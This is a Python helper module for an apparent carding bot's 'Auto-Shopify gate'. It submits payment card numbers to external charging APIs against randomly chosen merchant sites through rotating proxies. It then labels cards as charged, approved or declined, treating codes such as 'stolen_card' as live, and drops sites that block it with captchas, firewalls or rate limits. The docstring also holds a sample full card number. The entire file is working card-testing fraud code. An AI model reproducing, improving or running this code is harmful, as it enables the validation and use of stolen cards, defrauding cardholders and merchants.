"""
gates/shopify/common.py

Shared helpers for the Auto-Shopify gate.

API endpoint
------------
GET https://web-production-b4ec9.up.railway.app/shopify?site=<site>&cc=<cc|mm|yy|cvv>&proxy=<proxy>

Sample response:
    {
      "Gateway": "Shopify Payments",
      "Price": 24.0,
      "Response": "CARD_DECLINED",
      "Status": false,
      "Time": "8.46s",
      "cc": "4141700002481312|12|2026|161"
    }
"""

from __future__ import annotations

import asyncio
import json
import logging
import random
import re
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

import aiohttp

from db import get_user, update_user
from proxy import get_user_proxies_from_db
from .defaults import DEFAULT_PROXIES, DEFAULT_SITES


logger = logging.getLogger(__name__)


# ===== CONSTANTS =====
SHOPIFY_API_URLS = [
    "http://5.175.140.23:5001/shopify",
    "https://shopfiyapi-1.onrender.com/shopify",
    "https://shopfiyapi-2.onrender.com/shopify",
    "https://shopfiyapi.onrender.com/shopify",
    "http://noiraxiom.dev/shopify",
    "http://vipxcon.com/shopify",
]
SHOPIFY_API_BASE = SHOPIFY_API_URLS[0]

STATUS_CHARGED = "CHARGED"
STATUS_APPROVED = "APPROVED"
STATUS_DECLINED = "DECLINED"
STATUS_ERROR = "ERROR"


def format_gateway_with_price(gateway: Any, price: Any) -> str:
    """Return e.g. 'Shopify Payments $17' or 'Shopify Payments $17.50'."""
    label = str(gateway or "Shopify Payments").strip()
    try:
        p = float(price)
        if p > 0:
            price_str = f"${int(p)}" if p.is_integer() else f"${p:.2f}"
            return f"{label} {price_str}"
    except (TypeError, ValueError):
        pass
    return label

CHARGED_INDICATORS = (
    "order_paid",
    "order paid",
    "processing_error",  # some gates return this on live path

    "transaction success",
    "transaction successful",
    "thank you",
    "order confirmed",
    "order completed",
    "order placed",
    "order_placed",
    "payment success",
    "payment_completed",
    "card_charged",
)

APPROVED_INDICATORS = (
    "insufficient_funds",
    "insufficient funds",
    "incorrect_cvc",
    "DarkCarder05",
    "invalid_cvc",
    "invalid_cvv",
    "incorrect_zip",
    "3ds",
    "3d_authentication",
    "approved",
    "do_not_honor",
    "stolen_card",
    "lost_card",
    "card_velocity_exceeded",
)

# Substrings that indicate a DECLINE even if Status=True or response matches approved
DECLINED_INDICATORS = (
    "payment didn't go through",
    "payment did not go through",
    "temporary issue",
    "will be refunded",
    "refunded in",
    "debited amount will be",
    "ds_required",
    "ds required",
    "3ds_required",
    "risk check failed",
    "payment_risk",
    "card_declined",
    "card declined",
    "not processed",
    "unable to process",
)

# Patterns on which a site should be removed for this user
# (silently dropped + the card is retried with another site)
SITE_KILL_INDICATORS = (
    "international cards are not supported",
    "site requires login",
    "site dead",
    "could not resolve host",
    "invalid url",
    "not shopify",
    "no shopify",
    "shopify not detected",
    "site error",
    "site not working",
    "site is down",
    "404",
    "403 forbidden",
    "connection refused",
    "connection timed out",
    "connection reset",
    "ssl error",
    "no products",
    "out of stock",
    "product not found",
    "checkout not available",
    "invalid site",
    "bad gateway",
    "service unavailable",
    "gateway timeout",
    "artifact_dissatisfaction",
    "artifact dissatisfaction",
    "no valid payment method found",
    "no valid payment method",
    "payment method not available",
    "payment_method_not_available",
    "shop is unavailable",
    "shop unavailable",
    "throttled",
    "rate_limited",
    "rate limited",
    "too many requests",
    "429",
    "500 internal server error",
    "internal server error",
    "502 bad gateway",
    "503 service unavailable",
    "checkout_disabled",
    "checkout disabled",
    "shop_closed",
    "shop closed",
    "password protected",
    "password page",
    "captcha",
    "cloudflare",
    "access denied",
    "blocked",
    "proxy error",
    "proxy_error",
    "tunnel connection failed",
    "not enough connections",
    "mismatched_bill",
    "mismatched bill",
    "billing_mismatch",
    "billing mismatch",
    "decision_rule_block",
    "decision rule block",
    "decision_rule_blocked",
    "rule_block",
    "rule block",
    # ---- auto-retry / auto-remove triggers (added) ----
    "validation_custom",
    "validation custom",
    "unknown result",
    "unknown_result",
    "site not supported",
    "site_not_supported",
    "empty submit response",
    "empty submit",
    "empty_submit",
    "no response",
    "no_response",
    "site requires captcha",
    "site is protected",
)

CARD_PATTERN = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)


# =====================================================================
# CARD PARSING
# =====================================================================
def normalize_card(raw: str) -> Optional[str]:
    if not raw:
        return None
    match = CARD_PATTERN.search(raw)
    if not match:
        return None
    cc, mm, yy, cvv = match.groups()
    mm = mm.zfill(2)
    if len(yy) == 4:
        yy = yy[2:]
    return f"{cc}|{mm}|{yy}|{cvv}"


def extract_cards_from_text(text: str) -> List[str]:
    """Extract all valid CC|MM|YY|CVV cards from text.

    Uses regex finditer on the entire text so multiple cards on the same
    line (e.g. ``/msh card1 card2``) are all returned.
    """
    if not text:
        return []
    cards: List[str] = []
    seen: set = set()
    for match in CARD_PATTERN.finditer(text):
        cc, mm, yy, cvv = match.groups()
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[2:]
        card = f"{cc}|{mm}|{yy}|{cvv}"
        if card not in seen:
            seen.add(card)
            cards.append(card)
    return cards


# =====================================================================
# USER STATE
# =====================================================================
async def get_user_sites(user_id: int) -> List[str]:
    try:
        user_data = await get_user(user_id)
        sites = []
        if user_data:
            sites = user_data.get("custom_urls", []) or []
        if sites:
            return sites
    except Exception as e:
        logger.warning(f"Error loading sites for {user_id}: {e}")
    # Built-in sites — users need not add any
    return list(DEFAULT_SITES)


async def save_user_sites(user_id: int, sites: List[str]) -> bool:
    try:
        return await update_user(user_id, custom_urls=sites)
    except Exception as e:
        logger.warning(f"Error saving sites for {user_id}: {e}")
        return False


async def remove_user_site(user_id: int, dead_site: str) -> bool:
    try:
        sites = await get_user_sites(user_id)
        if dead_site in sites:
            sites.remove(dead_site)
            await save_user_sites(user_id, sites)
            return True
    except Exception as e:
        logger.warning(f"Error removing site '{dead_site}' for {user_id}: {e}")
    return False


async def get_proxies_for_user(user_id: int) -> List[str]:
    try:
        return await get_user_proxies_from_db(user_id) or []
    except Exception as e:
        logger.warning(f"Error loading proxies for {user_id}: {e}")
        return []


def format_proxy_for_api(proxy: str) -> str:
    if not proxy:
        return ""
    if proxy.startswith("http://"):
        return proxy[7:]
    if proxy.startswith("https://"):
        return proxy[8:]
    return proxy


def pick_random(items: List[str]) -> Optional[str]:
    return random.choice(items) if items else None


def pair_sites_with_proxies(
    cards: List[str], sites: List[str], proxies: List[str]
) -> List[Tuple[str, str, str]]:
    pairs: List[Tuple[str, str, str]] = []
    for idx, card in enumerate(cards):
        site = pick_random(sites) or ""
        proxy = pick_random(proxies) or ""
        pairs.append((card, site, proxy))
    return pairs


# =====================================================================
# API
# =====================================================================
def _safe_json(text: str) -> Optional[Dict[str, Any]]:
    if not text:
        return None
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        pass
    start = text.find("{")
    end = text.rfind("}")
    if start == -1 or end == -1 or end < start:
        return None
    try:
        return json.loads(text[start : end + 1])
    except json.JSONDecodeError:
        return None


async def call_shopify_api(
    card: str,
    site: str,
    proxy: str = "",
    timeout: int = 90,
    session: Optional[aiohttp.ClientSession] = None,
) -> Dict[str, Any]:
    """Call the Shopify charging API and normalize the result.

    The returned dict always has these keys:
      ``Status`` (CHARGED/APPROVED/DECLINED/ERROR — see classify_response below),
      ``Response``, ``Gateway``, ``Price``, ``Time``, ``cc``, ``site``, ``raw``.
    """
    proxy_param = format_proxy_for_api(proxy)
    params = {
        "site": site,
        "cc": card,
        "proxy": proxy_param,
    }
    # Prefer primary API; rotate on later attempts via random
    api_base = SHOPIFY_API_URLS[0] if random.random() < 0.55 else random.choice(SHOPIFY_API_URLS)
    api_url = f"{api_base}?{urllib.parse.urlencode(params, safe='|@:%+/')}"

    fallback = {
        "raw": None,
        "Gateway": "Shopify Payments",
        "Price": 0.0,
        "Response": "",
        "Status": False,
        "Time": "0s",
        "cc": card,
        "site": site,
    }

    own_session = False
    if session is None:
        timeout_obj = aiohttp.ClientTimeout(total=timeout)
        session = aiohttp.ClientSession(timeout=timeout_obj)
        own_session = True

    try:
        text = ""
        data = None
        last_err = ""
        # Try up to 3 different API bases for resilience
        bases = list(SHOPIFY_API_URLS)
        random.shuffle(bases)
        bases = [SHOPIFY_API_URLS[0]] + [b for b in bases if b != SHOPIFY_API_URLS[0]]
        for api_base in bases[:3]:
            api_url = f"{api_base}?{urllib.parse.urlencode(params, safe='|@:%+/')}"
            try:
                async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                    text = await resp.text()
                data = _safe_json(text)
                if data:
                    resp_l = str(data.get("Response", "")).lower()
                    soft = any(x in resp_l for x in (
                        "failed to fetch products", "request timeout", "http 429",
                        "rate limit", "application failed", "error: fai",
                    ))
                    if not soft:
                        break
                    last_err = resp_l[:120]
                    data = None
                    continue
                last_err = (text or "Invalid API response")[:120]
            except asyncio.TimeoutError:
                last_err = "Request timed out"
                continue
            except aiohttp.ClientError as e:
                last_err = f"HTTP error: {e}"
                continue
        if not data:
            fallback["Response"] = last_err or (text or "Invalid API response")[:300]
            return fallback

        status_raw = data.get("Status", data.get("status", False))
        # Preserve string statuses (Charged/Live/Approved) — bool() would break them
        return {
            "raw": data,
            "Gateway": data.get("Gateway", "Shopify Payments"),
            "Price": data.get("Price", 0.0),
            "Response": data.get("Response") or data.get("RawResponse") or "",
            "Status": status_raw,
            "Time": data.get("Time", "0s"),
            "cc": data.get("cc", card),
            "site": site,
        }
    finally:
        if own_session:
            try:
                await session.close()
            except Exception:
                pass


# =====================================================================
# CLASSIFICATION
# =====================================================================
def classify_response(api_response: Dict[str, Any]) -> str:
    response_text = (api_response.get("Response") or "").lower()
    status_raw = api_response.get("Status")
    status_s = str(status_raw).strip().lower() if status_raw is not None else ""

    if api_response.get("raw") is None:
        return STATUS_ERROR

    # Soft / transport errors — not a card decline
    soft = (
        "failed to fetch products", "request timeout", "proxy_required",
        "proxy required", "no valid payment", "failed to get session",
        "http 429", "rate limit", "application not found",
    )
    if any(x in response_text for x in soft) or status_s in ("false", "error", "dead") and any(
        x in response_text for x in soft
    ):
        # Still fall through for real declines; only soft if no decline text
        if not any(ind in response_text for ind in DECLINED_INDICATORS):
            if any(x in response_text for x in soft):
                return STATUS_ERROR

    # Explicit string statuses from Shadow APIs
    if status_s in ("charged", "live", "success") or status_raw is True:
        if any(ind in response_text for ind in CHARGED_INDICATORS) or status_s == "charged":
            return STATUS_CHARGED
        if any(ind in response_text for ind in DECLINED_INDICATORS):
            return STATUS_DECLINED
        return STATUS_APPROVED
    if status_s in ("approved", "approve"):
        return STATUS_APPROVED

    if any(ind in response_text for ind in DECLINED_INDICATORS):
        return STATUS_DECLINED

    if any(ind in response_text for ind in CHARGED_INDICATORS):
        return STATUS_CHARGED

    if any(ind in response_text for ind in APPROVED_INDICATORS):
        return STATUS_APPROVED

    # Status false with empty/unknown response
    if status_raw is False or status_s in ("false", "0", "declined", "dead"):
        return STATUS_DECLINED

    return STATUS_DECLINED


def is_site_killed_by(api_response: Dict[str, Any]) -> bool:
    text = (api_response.get("Response") or "").lower()
    if not text:
        return False
    return any(ind in text for ind in SITE_KILL_INDICATORS)


def status_emoji(category: str) -> str:
    if category == STATUS_CHARGED:
        return "🟢"
    if category == STATUS_APPROVED:
        return "🔵"
    if category == STATUS_DECLINED:
        return "🔴"
    return "⚪"
